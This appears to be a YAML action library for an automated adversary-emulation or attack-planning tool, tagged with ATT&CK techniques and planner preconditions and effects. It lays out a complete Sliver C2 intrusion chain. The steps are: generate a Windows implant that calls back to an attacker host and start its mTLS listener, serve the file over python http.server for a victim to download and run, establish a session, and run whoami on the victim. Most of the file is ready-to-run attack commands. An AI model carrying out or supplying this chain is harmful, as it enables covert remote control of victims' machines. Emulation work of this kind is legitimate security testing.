attack_action_sequence:
  - uuid: sliver-payload-windows-exe
    name: Build the executable file of a Sliver implant (for Windows)
    id:
      - T1071.001
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.
    execution:
      executor: Sliver Console
      command: |
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        required: true
      LPORT:
        default:
        description: listening port of the attacter machine
        required: true
      SAVE_PATH:
        default:
        description: Saved path of the generated payload
        required: true
        pddl_index: string0_var_in_plan
    preconditions:
      - (os-windows ?target - host)
    effects:
      - (sliver-implant-payload ?p - payload ?target - host)
      - (file-payload ?p - payload ?file - file)
      - (file-on-attacker ?path - string ?file - file)
      - (standalone-exe-file ?file - file)
      - (payload-handler-set ?p - payload)
      - (callback-covered ?file - file)
  - uuid: simulate-download-execute-file
    name: Simulate the victim download and execute malicious payload file
    id:
      - T1204.002
    source: Manual
    supported_platforms:
      - windows
      - linux
    tactics:
      - Execution
    technique:
      - 'User Execution: Malicious File'
    description:
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server #{LPORT}

        (On victim's machine)
        1. Open #{LHOST}:8000 in the browser
        2. Navigate to the path of the target payload file
        3. Download the payload file
        4. Execute the payload file to #{SAVE_PATH} (If on a Linux machine, you also need to chmod the file)
    arguments:
      LHOST:
        default:
        description: IP address of the http file server (typically the attacker machine)
        required: true
      LPORT:
        default: 8000
        description: port of the http file server
        required: true
      SAVE_PATH:
        default:
        description: Saved path of the downloaded payload
        required: true
        pddl_index: string1_var_in_plan
    preconditions:
      - (allow-simulate-user-action ?target - host)
      - operator: or
        operands:
          - (os-linux ?target - host)
          - (os-windows ?target - host)
          - (os-macos ?target - host)
      - (file-on-attacker ?localpath - string ?file - file)
      - operator: or
        operands:
          - (standalone-exe-file ?file - file)
          - (elf-file ?file - file)
      - (callback-covered ?file - file)
    effects:
      - (file-exists ?path - string ?file - file ?target - host)
      - (file-executed ?file - file ?target - host)
  - uuid: execute-sliver-payload-file
    name: Execute a Sliver Implant Payload
    id:
      - T1071.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - Application Layer Protocol - Web Protocols
    description: |
      Executing a Sliver implant payload will establish a Sliver session.
    execution:
      executor: Sliver Session Establish
      command: |
        None
    arguments:
    preconditions:
      - (sliver-implant-payload ?p - payload ?target - host)
      - (file-payload ?p - payload ?f - file)
      - (file-executed ?f - file ?target - host)
      - (payload-handler-set ?p - payload)
    effects:
      - (sliver-session ?s - executor ?target - host)
      - operator: When
        params:
          condition: (file-executed-elevated ?f - file ?target - host)
          effect: (elevated-executor ?s - executor)
  - uuid: sliver-whoami
    name: User Context Verification
    id:
      - T1087.001
    source: Sliver
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Discovery
    technique:
      - |
        Account Discovery: Local Account
    description: The `whoami` command retrieves the current user identity of the system.
      It executes the command on the remote system and returns the username of the
      account that is currently logged in. This command includes flag for setting
      a timeout.
    execution:
      executor: Sliver Executor
      command: whoami(session_id=#{executor})
    arguments:
      executor:
        description: The session ID of the active Sliver connection.
        required: true
        pddl_index: executor4_var_in_plan
    preconditions:
      - operator: or
        operands:
          - (os-windows ?target - host)
          - (os-linux ?target - host)
          - (os-macos ?target - host)
      - (sliver-session ?executorID - executor ?target - host)
    effects:
      - (local-account-info-known ?target - host)
